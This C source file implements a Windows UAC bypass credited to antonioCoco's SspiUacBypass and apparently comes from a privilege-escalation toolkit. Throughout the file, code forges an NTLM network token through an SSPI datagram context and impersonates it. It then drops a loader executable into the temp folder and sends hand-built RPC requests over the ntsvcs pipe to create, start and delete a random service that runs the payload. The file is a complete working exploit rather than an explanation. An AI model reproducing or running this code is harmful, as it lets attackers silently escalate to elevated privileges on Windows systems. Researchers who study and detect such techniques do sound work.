/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       ANTONIOCOCO.C
*
*  VERSION:     3.65
*
*  DATE:        01 Oct 2023
*
*  UAC bypass method from antonioCoco.
*
*  https://github.com/antonioCoco/SspiUacBypass
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

#define MAX_MESSAGE_SIZE 12000

// rpc command ids
#define RPC_CMD_ID_OPEN_SC_MANAGERW 15
#define RPC_CMD_ID_CREATE_SERVICEW 12
#define RPC_CMD_ID_START_SERVICEW 19
#define RPC_CMD_ID_DELETE_SERVICE 2

// rpc command output lengths
#define RPC_OUTPUT_LENGTH_OPEN_SC_MANAGER 24
#define RPC_OUTPUT_LENGTH_CREATE_SERVICE 28
#define RPC_OUTPUT_LENGTH_START_SERVICE 4
#define RPC_OUTPUT_LENGTH_DELETE_SERVICE 4

#define MAX_RPC_PACKET_LENGTH 4096
#define MAX_PROCEDURE_DATA_LENGTH 2048

#define CALC_ALIGN_PADDING(VALUE_LENGTH, ALIGN_BYTES) (((((VALUE_LENGTH) + (ALIGN_BYTES) - 1) / (ALIGN_BYTES)) * (ALIGN_BYTES)) - (VALUE_LENGTH))

// {8a885d04-1ceb-11c9-9fe8-08002b104860} (NDR)
#define RPC_NDR_UUID (RPC_WSTR)L"8a885d04-1ceb-11c9-9fe8-08002b104860"
#define SVCCTL_UUID (RPC_WSTR)L"367abb81-9844-35f1-ad32-98f038001003"

typedef struct _RPC_BASE_HEADER {
    WORD wVersion;
    BYTE bPacketType;
    BYTE bPacketFlags;
    DWORD dwDataRepresentation;
    WORD wFragLength;
    WORD wAuthLength;
    DWORD dwCallIndex;
} RPC_BASE_HEADER, * PRPC_BASE_HEADER;

typedef struct _RPC_REQUEST_HEADER {
    DWORD dwAllocHint;
    WORD wContextID;
    WORD wProcedureNumber;
} RPC_REQUEST_HEADER, * PRPC_REQUEST_HEADER;

typedef struct _RPC_RESPONSE_HEADER {
    DWORD dwAllocHint;
    WORD wContextID;
    BYTE bCancelCount;
    BYTE bAlign[1];
} RPC_RESPONSE_HEADER, * PRPC_RESPONSE_HEADER;

typedef struct _RPC_BIND_REQUEST_CONTEXT_ENTRY {
    WORD wContextID;
    WORD wTransItemCount;
    UUID InterfaceUUID;
    DWORD dwInterfaceVersion;
    UUID TransferSyntaxUUID;
    DWORD dwTransferSyntaxVersion;
} RPC_BIND_REQUEST_CONTEXT_ENTRY, * PRPC_BIND_REQUEST_CONTEXT_ENTRY;

typedef struct _RPC_BIND_REQUEST_HEADER {
    WORD wMaxSendFrag;
    WORD wMaxRecvFrag;
    DWORD dwAssocGroup;
    BYTE bContextCount;
    BYTE bAlign[3];
    RPC_BIND_REQUEST_CONTEXT_ENTRY Context;
} RPC_BIND_REQUEST_HEADER, * PRPC_BIND_REQUEST_HEADER;

typedef struct _RPC_BIND_RESPONSE_CONTEXT_ENTRY {
    WORD wResult;
    WORD wAlign;
    BYTE bTransferSyntax[16];
    DWORD dwTransferSyntaxVersion;
} RPC_BIND_RESPONSE_CONTEXT_ENTRY, * PRPC_BIND_RESPONSE_CONTEXT_ENTRY;

typedef struct _RPC_BIND_RESPONSE_HEADER1 {
    WORD wMaxSendFrag;
    WORD wMaxRecvFrag;
    DWORD dwAssocGroup;
} RPC_BIND_RESPONSE_HEADER1, * PRPC_BIND_RESPONSE_HEADER1;

typedef struct _RPC_BIND_RESPONSE_HEADER2 {
    DWORD dwContextResultCount;
    RPC_BIND_RESPONSE_CONTEXT_ENTRY Context;
} RPC_BIND_RESPONSE_HEADER2, * PRPC_BIND_RESPONSE_HEADER2;

typedef struct _RPC_CONNECTION {
    HANDLE hFile;
    DWORD dwCallIndex;
    DWORD dwInputError;
    DWORD dwRequestInitialized;
    BYTE bProcedureInputData[MAX_PROCEDURE_DATA_LENGTH];
    DWORD dwProcedureInputDataLength;
    BYTE bProcedureOutputData[MAX_PROCEDURE_DATA_LENGTH];
    DWORD dwProcedureOutputDataLength;
} RPC_CONNECTION, * PRPC_CONNECTION;

BOOL ucmxRpcBind(
    _In_ PRPC_CONNECTION pRpcConnection,
    _In_ RPC_WSTR pInterfaceUUID,
    _In_ DWORD dwInterfaceVersion)
{
    RPC_BASE_HEADER RpcBaseHeader;
    RPC_BIND_REQUEST_HEADER RpcBindRequestHeader;
    DWORD dwBytesWritten = 0;
    DWORD dwBytesRead = 0;
    BYTE bResponseData[MAX_RPC_PACKET_LENGTH];
    RPC_BASE_HEADER* pRpcResponseBaseHeader = NULL;
    RPC_BIND_RESPONSE_HEADER1* pRpcBindResponseHeader1 = NULL;
    RPC_BIND_RESPONSE_HEADER2* pRpcBindResponseHeader2 = NULL;
    BYTE* pSecondaryAddrHeaderBlock = NULL;
    WORD wSecondaryAddrLen = 0;
    DWORD dwSecondaryAddrAlign = 0;

    //
    // Set base header details.
    //
    RtlSecureZeroMemory(&RpcBaseHeader, sizeof(RpcBaseHeader));
    RpcBaseHeader.wVersion = 5;
    RpcBaseHeader.bPacketType = 11;
    RpcBaseHeader.bPacketFlags = 3;
    RpcBaseHeader.dwDataRepresentation = 0x10;
    RpcBaseHeader.wFragLength = sizeof(RpcBaseHeader) + sizeof(RpcBindRequestHeader);
    RpcBaseHeader.wAuthLength = 0;
    RpcBaseHeader.dwCallIndex = pRpcConnection->dwCallIndex;

    //
    // Set bind request header details.
    //
    RtlSecureZeroMemory(&RpcBindRequestHeader, sizeof(RpcBindRequestHeader));
    RpcBindRequestHeader.wMaxSendFrag = MAX_RPC_PACKET_LENGTH;
    RpcBindRequestHeader.wMaxRecvFrag = MAX_RPC_PACKET_LENGTH;
    RpcBindRequestHeader.dwAssocGroup = 0;
    RpcBindRequestHeader.bContextCount = 1;
    RpcBindRequestHeader.Context.wContextID = 0;
    RpcBindRequestHeader.Context.wTransItemCount = 1;
    RpcBindRequestHeader.Context.dwTransferSyntaxVersion = 2;

    if (RPC_S_OK != UuidFromString(pInterfaceUUID, &RpcBindRequestHeader.Context.InterfaceUUID))
        return FALSE;

    RpcBindRequestHeader.Context.dwInterfaceVersion = dwInterfaceVersion;
    if (RPC_S_OK != UuidFromString(RPC_NDR_UUID, &RpcBindRequestHeader.Context.TransferSyntaxUUID))
        return FALSE;

    //
    // Write base header.
    //
    if (!WriteFile(pRpcConnection->hFile,
        &RpcBaseHeader,
        sizeof(RpcBaseHeader),
        &dwBytesWritten,
        NULL))
    {
        return FALSE;
    }

    //
    // Write bind request header.
    //
    if (!WriteFile(pRpcConnection->hFile,
        &RpcBindRequestHeader,
        sizeof(RpcBindRequestHeader),
        &dwBytesWritten,
        NULL))
    {
        return FALSE;
    }

    pRpcConnection->dwCallIndex++;

    //
    // Get bind response.
    //
    RtlSecureZeroMemory(&bResponseData, sizeof(bResponseData));
    if (!ReadFile(pRpcConnection->hFile,
        bResponseData,
        sizeof(bResponseData),
        &dwBytesRead,
        NULL))
    {
        return FALSE;
    }

    //
    // Get a ptr to the base response header.
    //
    pRpcResponseBaseHeader = (PRPC_BASE_HEADER)bResponseData;

    //
    // Validate base response header.
    //
    if ((pRpcResponseBaseHeader->wVersion != 5) ||
        (pRpcResponseBaseHeader->bPacketType != 12) ||
        (pRpcResponseBaseHeader->bPacketFlags != 3) ||
        (pRpcResponseBaseHeader->wFragLength != dwBytesRead))
    {
        return FALSE;
    }

    //
    // Get a ptr to the main bind response header body.
    //   
    pRpcBindResponseHeader1 = (PRPC_BIND_RESPONSE_HEADER1)RtlOffsetToPointer((BYTE*)pRpcResponseBaseHeader, sizeof(RPC_BASE_HEADER));

    //
    // Get secondary addr header ptr.
    //
    pSecondaryAddrHeaderBlock = (BYTE*)RtlOffsetToPointer((BYTE*)pRpcBindResponseHeader1, sizeof(RPC_BIND_RESPONSE_HEADER1));
    wSecondaryAddrLen = *(WORD*)pSecondaryAddrHeaderBlock;

    //
    // Validate secondary addr length.
    //
    if (wSecondaryAddrLen > 256)
        return FALSE;

    //
    // Calculate padding for secondary addr value if necessary.
    //
    dwSecondaryAddrAlign = CALC_ALIGN_PADDING((sizeof(WORD) + wSecondaryAddrLen), sizeof(ULONG));

    //
    // Get a ptr to the main bind response header body (after the variable-length secondary addr field).
    //
    pRpcBindResponseHeader2 = (PRPC_BIND_RESPONSE_HEADER2)RtlOffsetToPointer((BYTE*)pSecondaryAddrHeaderBlock,
        sizeof(WORD) + wSecondaryAddrLen + dwSecondaryAddrAlign);

    //
    // Validate context count.
    // Ensure the result value for context #1 was successful.
    //
    if ((pRpcBindResponseHeader2->dwContextResultCount != 1) ||
        (pRpcBindResponseHeader2->Context.wResult != 0))
    {
        return FALSE;
    }

    return TRUE;
}

BOOL ucmxRpcConnect(
    _In_ LPCWSTR lpPipeName,
    _In_ RPC_WSTR pInterfaceUUID,
    _In_ DWORD dwInterfaceVersion,
    _In_ PRPC_CONNECTION pRpcConnection)
{
    HANDLE hFile = NULL;
    WCHAR szPipePath[MAX_PATH * 2];
    RPC_CONNECTION RpcConnection;

    //
    // Set pipe path.
    //
    RtlSecureZeroMemory(szPipePath, sizeof(szPipePath));
    _strcpy(szPipePath, TEXT("\\\\127.0.0.1\\pipe\\"));
    _strcat(szPipePath, lpPipeName);

    //
    // Open rpc pipe.
    //
    hFile = CreateFile(szPipePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    //
    // Initialize rpc connection data.
    //
    RtlSecureZeroMemory(&RpcConnection, sizeof(RpcConnection));
    RpcConnection.hFile = hFile;
    RpcConnection.dwCallIndex = 1;

    //
    // Bind rpc connection.
    //
    if (!ucmxRpcBind(&RpcConnection, pInterfaceUUID, dwInterfaceVersion))
        return FALSE;

    //
    // Store connection data.
    //
    RtlCopyMemory(pRpcConnection, &RpcConnection, sizeof(RpcConnection));

    return TRUE;
}

VOID ucmxRpcInitializeRequestData(
    _In_ PRPC_CONNECTION pRpcConnection)
{
    //
    // Initialize request data.
    //
    RtlSecureZeroMemory(pRpcConnection->bProcedureInputData, sizeof(pRpcConnection->bProcedureInputData));
    pRpcConnection->dwProcedureInputDataLength = 0;
    RtlSecureZeroMemory(pRpcConnection->bProcedureOutputData, sizeof(pRpcConnection->bProcedureOutputData));
    pRpcConnection->dwProcedureOutputDataLength = 0;

    //
    // Reset input error flag.
    //
    pRpcConnection->dwInputError = 0;

    pRpcConnection->dwRequestInitialized = 1;
}

BOOL ucmxRpcSendRequest(
    _In_ PRPC_CONNECTION pRpcConnection,
    _In_ DWORD dwProcedureNumber)
{
    RPC_BASE_HEADER RpcBaseHeader;
    RPC_REQUEST_HEADER RpcRequestHeader;
    DWORD dwBytesWritten = 0;
    BYTE bResponseData[MAX_RPC_PACKET_LENGTH];
    RPC_BASE_HEADER* pRpcResponseBaseHeader = NULL;
    RPC_RESPONSE_HEADER* pRpcResponseHeader = NULL;
    DWORD dwProcedureResponseDataLength = 0;
    DWORD dwBytesRead = 0;
    BYTE* pTempProcedureResponseDataPtr = NULL;

    //
    // Ensure rpc request has been initialized.
    //
    if (pRpcConnection->dwRequestInitialized == 0)
        return FALSE;

    //
    // Clear initialised flag.
    //
    pRpcConnection->dwRequestInitialized = 0;

    //
    // Check for input errors.
    //
    if (pRpcConnection->dwInputError != 0)
        return FALSE;

    //
    // Set base header details.
    //
    RtlSecureZeroMemory(&RpcBaseHeader, sizeof(RpcBaseHeader));
    RpcBaseHeader.wVersion = 5;
    RpcBaseHeader.bPacketType = 0;
    RpcBaseHeader.bPacketFlags = 3;
    RpcBaseHeader.dwDataRepresentation = 0x10;
    RpcBaseHeader.wFragLength = (WORD)(sizeof(RPC_BASE_HEADER) + sizeof(RPC_REQUEST_HEADER) + pRpcConnection->dwProcedureInputDataLength);
    RpcBaseHeader.wAuthLength = 0;
    RpcBaseHeader.dwCallIndex = pRpcConnection->dwCallIndex;

    //
    // Set request header details.
    //
    RtlSecureZeroMemory(&RpcRequestHeader, sizeof(RpcRequestHeader));
    RpcRequestHeader.dwAllocHint = 0;
    RpcRequestHeader.wContextID = 0;
    RpcRequestHeader.wProcedureNumber = (WORD)dwProcedureNumber;

    //
    // Write base header.
    //
    if (!WriteFile(pRpcConnection->hFile,
        &RpcBaseHeader,
        sizeof(RpcBaseHeader),
        &dwBytesWritten, NULL))
    {
        return FALSE;
    }

    //
    // Write request header.
    //
    if (!WriteFile(pRpcConnection->hFile,
        &RpcRequestHeader,
        sizeof(RpcRequestHeader),
        &dwBytesWritten,
        NULL))
    {
        return FALSE;
    }

    //
    // Write request body.
    //
    if (!WriteFile(pRpcConnection->hFile,
        pRpcConnection->bProcedureInputData,
        pRpcConnection->dwProcedureInputDataLength,
        &dwBytesWritten,
        NULL))
    {
        return FALSE;
    }

    //
    // Increase call index.
    //
    pRpcConnection->dwCallIndex++;

    //
    // Get bind response.
    //
    RtlSecureZeroMemory(&bResponseData, sizeof(bResponseData));
    if (!ReadFile(pRpcConnection->hFile,
        bResponseData,
        sizeof(bResponseData),
        &dwBytesRead,
        NULL))
    {
        return FALSE;
    }

    //
    // Get a ptr to the base response header.
    //
    pRpcResponseBaseHeader = (PRPC_BASE_HEADER)bResponseData;

    //
    // Validate base response header.
    //
    if ((pRpcResponseBaseHeader->wVersion != 5) ||
        (pRpcResponseBaseHeader->bPacketType != 2) ||
        (pRpcResponseBaseHeader->bPacketFlags != 3) ||
        (pRpcResponseBaseHeader->wFragLength != dwBytesRead))
    {
        return FALSE;
    }

    //
    // Get a ptr to the main response header body.
    //
    pRpcResponseHeader = (RPC_RESPONSE_HEADER*)RtlOffsetToPointer((BYTE*)pRpcResponseBaseHeader, sizeof(RPC_BASE_HEADER));

    //
    // Context ID must be 0.
    //
    if (pRpcResponseHeader->wContextID != 0)
        return FALSE;

    //
    // Calculate command response data length.
    //
    dwProcedureResponseDataLength = pRpcResponseBaseHeader->wFragLength - sizeof(RPC_BASE_HEADER) - sizeof(RPC_RESPONSE_HEADER);

    //
    // Store response data.
    //
    if (dwProcedureResponseDataLength > sizeof(pRpcConnection->bProcedureOutputData))
        return FALSE;

    pTempProcedureResponseDataPtr = (BYTE*)RtlOffsetToPointer((BYTE*)pRpcResponseHeader, sizeof(RPC_RESPONSE_HEADER));
    RtlCopyMemory(pRpcConnection->bProcedureOutputData, pTempProcedureResponseDataPtr, dwProcedureResponseDataLength);

    //
    // Store response data length.
    //
    pRpcConnection->dwProcedureOutputDataLength = dwProcedureResponseDataLength;

    return TRUE;
}

BOOL ucmxRpcAppendRequestData_Binary(
    _In_ PRPC_CONNECTION RpcConnection,
    _In_ BYTE* Data,
    _In_ DWORD DataLength,
    _In_ BOOL IsUnicode)
{
    DWORD dwBytesAvailable = 0;
    DWORD dwDataLength = DataLength;

    if (IsUnicode)
        dwDataLength *= sizeof(WCHAR);

    //
    // Ensure the request has been initialized.
    //
    if (RpcConnection->dwRequestInitialized == 0)
        return FALSE;

    //
    // Calculate number of bytes remaining in the input buffer.
    //
    dwBytesAvailable = sizeof(RpcConnection->bProcedureInputData) - RpcConnection->dwProcedureInputDataLength;
    if (dwDataLength > dwBytesAvailable)
    {
        //
        // Set input error flag.
        //
        RpcConnection->dwInputError = 1;
        return FALSE;
    }

    //
    // Store data in buffer.
    //
    RtlCopyMemory(&RpcConnection->bProcedureInputData[RpcConnection->dwProcedureInputDataLength], Data, dwDataLength);
    RpcConnection->dwProcedureInputDataLength += dwDataLength;
    RpcConnection->dwProcedureInputDataLength += CALC_ALIGN_PADDING(dwDataLength, sizeof(ULONG));

    return TRUE;
}

BOOL ucmxRpcAppendRequestData_Dword(
    _In_ PRPC_CONNECTION pRpcConnection,
    _In_ DWORD dwValue)
{
    return ucmxRpcAppendRequestData_Binary(
        pRpcConnection,
        (BYTE*)&dwValue,
        sizeof(DWORD),
        FALSE);
}

BOOL ucmxInvokeCreateSvcRpcMain(
    _In_ LPWSTR lpszPayload)
{
    BOOL bResult = FALSE;
    RPC_CONNECTION RpcConnection;
    BYTE bServiceManagerObject[20];
    BYTE bServiceObject[20];
    DWORD dwReturnValue = 0;
    DWORD dwServiceNameLength = 0;
    WCHAR szServiceName[32];
    DWORD dwServiceCommandLineLength = 0;

    RpcConnection.hFile = INVALID_HANDLE_VALUE;

    do {

        //
        // Generate random name for service.
        //
        szServiceName[0] = 0;
        supBinTextEncode(supGetTickCount64(), szServiceName);

        dwServiceNameLength = (DWORD)(_strlen(szServiceName) + 1);
        dwServiceCommandLineLength = (DWORD)(_strlen(lpszPayload) + 1);

        if (!ucmxRpcConnect(TEXT("ntsvcs"), SVCCTL_UUID, 2, &RpcConnection))
            break;

        //
        // OpenSCManager.
        //
        ucmxRpcInitializeRequestData(&RpcConnection);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, SC_MANAGER_ALL_ACCESS);

        if (!ucmxRpcSendRequest(&RpcConnection, RPC_CMD_ID_OPEN_SC_MANAGERW))
            break;

        if (RpcConnection.dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_OPEN_SC_MANAGER)
            break;

        dwReturnValue = *(DWORD*)&RpcConnection.bProcedureOutputData[20];
        if (dwReturnValue != 0)
            break;

        RtlCopyMemory(bServiceManagerObject, &RpcConnection.bProcedureOutputData[0], sizeof(bServiceManagerObject));

        //
        // CreateService RPC request.
        //
        ucmxRpcInitializeRequestData(&RpcConnection);
        ucmxRpcAppendRequestData_Binary(&RpcConnection, bServiceManagerObject, sizeof(bServiceManagerObject), FALSE);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, dwServiceNameLength);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, dwServiceNameLength);
        ucmxRpcAppendRequestData_Binary(&RpcConnection, (BYTE*)szServiceName, dwServiceNameLength, TRUE);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, SERVICE_ALL_ACCESS);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, SERVICE_WIN32_OWN_PROCESS);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, SERVICE_DEMAND_START);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, SERVICE_ERROR_IGNORE);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, dwServiceCommandLineLength);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, dwServiceCommandLineLength);
        ucmxRpcAppendRequestData_Binary(&RpcConnection, (BYTE*)lpszPayload, dwServiceCommandLineLength, TRUE);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);

        if (!ucmxRpcSendRequest(&RpcConnection, RPC_CMD_ID_CREATE_SERVICEW))
            break;

        if (RpcConnection.dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_CREATE_SERVICE)
            break;

        dwReturnValue = *(DWORD*)&RpcConnection.bProcedureOutputData[24];
        if (dwReturnValue != 0)
            break;

        RtlCopyMemory(bServiceObject, &RpcConnection.bProcedureOutputData[4], sizeof(bServiceObject));

        //
        // StartService RPC request.
        //
        ucmxRpcInitializeRequestData(&RpcConnection);
        ucmxRpcAppendRequestData_Binary(&RpcConnection, bServiceObject, sizeof(bServiceObject), FALSE);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);
        ucmxRpcAppendRequestData_Dword(&RpcConnection, 0);

        if (!ucmxRpcSendRequest(&RpcConnection, RPC_CMD_ID_START_SERVICEW))
            break;

        if (RpcConnection.dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_START_SERVICE)
            break;

        dwReturnValue = *(DWORD*)&RpcConnection.bProcedureOutputData[0];
        if (dwReturnValue != 0 && dwReturnValue != ERROR_SERVICE_REQUEST_TIMEOUT)
            break;

        //
        // DeleteService RPC request.
        //
        ucmxRpcInitializeRequestData(&RpcConnection);
        ucmxRpcAppendRequestData_Binary(&RpcConnection, bServiceObject, sizeof(bServiceObject), FALSE);

        if (!ucmxRpcSendRequest(&RpcConnection, RPC_CMD_ID_DELETE_SERVICE))
            break;

        if (RpcConnection.dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_DELETE_SERVICE)
            break;

        dwReturnValue = *(DWORD*)&RpcConnection.bProcedureOutputData[0];
        if (dwReturnValue != 0)
            break;

        bResult = TRUE;

    } while (FALSE);

    if (RpcConnection.hFile != INVALID_HANDLE_VALUE)
        CloseHandle(RpcConnection.hFile);

    return bResult;
}

SECURITY_STATUS ucmxForgeNetworkAuthToken(
    _Out_ PHANDLE TokenHandle
) {

    CredHandle hCredClient, hCredServer;
    TimeStamp lifetimeClient, lifetimeServer;
    SecBufferDesc negotiateDesc, challengeDesc, authenticateDesc;
    SecBuffer negotiateBuffer, challengeBuffer, authenticateBuffer;
    CtxtHandle clientContextHandle, serverContextHandle;
    ULONG clientContextAttributes, serverContextAttributes;
    SECURITY_STATUS secStatus;
    HANDLE hTokenNetwork = NULL;

    *TokenHandle = NULL;
    serverContextHandle.dwLower = 0;
    serverContextHandle.dwUpper = 0;
    clientContextHandle.dwLower = 0;
    clientContextHandle.dwUpper = 0;
    hCredServer.dwLower = 0;
    hCredServer.dwUpper = 0;

    RtlSecureZeroMemory(&negotiateBuffer, sizeof(negotiateBuffer));
    RtlSecureZeroMemory(&challengeBuffer, sizeof(challengeBuffer));
    RtlSecureZeroMemory(&authenticateBuffer, sizeof(authenticateBuffer));

    do {

        secStatus = AcquireCredentialsHandle(NULL,
            (LPWSTR)NTLMSP_NAME,
            SECPKG_CRED_OUTBOUND,
            NULL,
            NULL,
            NULL,
            NULL,
            &hCredClient,
            &lifetimeClient);

        if (!NT_SUCCESS(secStatus))
            break;

        secStatus = AcquireCredentialsHandle(NULL,
            (LPWSTR)NTLMSP_NAME,
            SECPKG_CRED_INBOUND,
            NULL,
            NULL,
            NULL,
            NULL,
            &hCredServer,
            &lifetimeServer);

        if (!NT_SUCCESS(secStatus))
            break;

        negotiateDesc.ulVersion = 0;
        negotiateDesc.cBuffers = 1;
        negotiateDesc.pBuffers = &negotiateBuffer;
        negotiateBuffer.cbBuffer = MAX_MESSAGE_SIZE;
        negotiateBuffer.BufferType = SECBUFFER_TOKEN;
        negotiateBuffer.pvBuffer = supHeapAlloc(MAX_MESSAGE_SIZE);

        secStatus = InitializeSecurityContext(&hCredClient,
            NULL,
            NULL,
            ISC_REQ_DATAGRAM,
            0,
            SECURITY_NATIVE_DREP,
            NULL,
            0,
            &clientContextHandle,
            &negotiateDesc,
            &clientContextAttributes,
            &lifetimeClient);

        if (!NT_SUCCESS(secStatus))
            break;

        challengeDesc.ulVersion = 0;
        challengeDesc.cBuffers = 1;
        challengeDesc.pBuffers = &challengeBuffer;
        challengeBuffer.cbBuffer = MAX_MESSAGE_SIZE;
        challengeBuffer.BufferType = SECBUFFER_TOKEN;
        challengeBuffer.pvBuffer = supHeapAlloc(MAX_MESSAGE_SIZE);

        secStatus = AcceptSecurityContext(&hCredServer,
            NULL,
            &negotiateDesc,
            ASC_REQ_DATAGRAM,
            SECURITY_NATIVE_DREP,
            &serverContextHandle,
            &challengeDesc,
            &serverContextAttributes,
            &lifetimeServer);

        if (!NT_SUCCESS(secStatus))
            break;

        authenticateDesc.ulVersion = 0;
        authenticateDesc.cBuffers = 1;
        authenticateDesc.pBuffers = &authenticateBuffer;
        authenticateBuffer.cbBuffer = MAX_MESSAGE_SIZE;
        authenticateBuffer.BufferType = SECBUFFER_TOKEN;
        authenticateBuffer.pvBuffer = supHeapAlloc(MAX_MESSAGE_SIZE);

        secStatus = InitializeSecurityContext(NULL,
            &clientContextHandle,
            NULL,
            0,
            0,
            SECURITY_NATIVE_DREP,
            &challengeDesc,
            0,
            &clientContextHandle,
            &authenticateDesc,
            &clientContextAttributes,
            &lifetimeClient);

        if (!NT_SUCCESS(secStatus))
            break;

        secStatus = AcceptSecurityContext(NULL,
            &serverContextHandle,
            &authenticateDesc,
            0,
            SECURITY_NATIVE_DREP,
            &serverContextHandle,
            NULL,
            &serverContextAttributes,
            &lifetimeServer);

        if (!NT_SUCCESS(secStatus))
            break;

        secStatus = QuerySecurityContextToken(&serverContextHandle, &hTokenNetwork);

    } while (FALSE);

    if (negotiateBuffer.pvBuffer)
        supHeapFree(negotiateBuffer.pvBuffer);
    if (challengeBuffer.pvBuffer)
        supHeapFree(challengeBuffer.pvBuffer);
    if (authenticateBuffer.pvBuffer)
        supHeapFree(authenticateBuffer.pvBuffer);

    FreeCredentialsHandle(&hCredClient);
    FreeCredentialsHandle(&hCredServer);

    DeleteSecurityContext(&clientContextHandle);
    DeleteSecurityContext(&serverContextHandle);

    *TokenHandle = hTokenNetwork;
    return secStatus;
}

/*
* ucmSspiDatagramMethod
*
* Purpose:
*
* Bypass UAC using SSPI datagram context.
*
*/
NTSTATUS ucmSspiDatagramMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL bNeedCleanup = FALSE, bImpersonate = FALSE;
    SECURITY_IMPERSONATION_LEVEL impLevel;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HANDLE hToken = NULL;
    WCHAR szLoaderFileName[MAX_PATH * 2];

    //
    // Forge token for impersonation.
    //
    MethodResult = ucmxForgeNetworkAuthToken(&hToken);
    if (!NT_SUCCESS(MethodResult))
        return MethodResult;

    do {

        MethodResult = STATUS_ACCESS_DENIED;

        //
        // Write loader to the %temp%
        //
        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            AKATSUKI_ENTRYPOINT_EXE,
            TRUE))
        {
            break;
        }

        RtlSecureZeroMemory(&szLoaderFileName, sizeof(szLoaderFileName));
        _strcpy(szLoaderFileName, g_ctx->szTempDirectory);
        _strcat(szLoaderFileName, THEOLDNEWTHING);
        _strcat(szLoaderFileName, TEXT(".exe"));

        bNeedCleanup = supWriteBufferToFile(szLoaderFileName, ProxyDll, ProxyDllSize);
        if (!bNeedCleanup)
            break;

        bImpersonate = ImpersonateLoggedOnUser(hToken);
        if (!bImpersonate)
            break;

        if (!supGetThreadTokenImpersonationLevel(NtCurrentThread(), &impLevel))
            break;

        if (impLevel < SecurityImpersonation)
            break;

        if (ucmxInvokeCreateSvcRpcMain(szLoaderFileName))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (bImpersonate)
        RevertToSelf();

    if (hToken)
        CloseHandle(hToken);

    if (bNeedCleanup)
        DeleteFile(szLoaderFileName);

    return MethodResult;
}
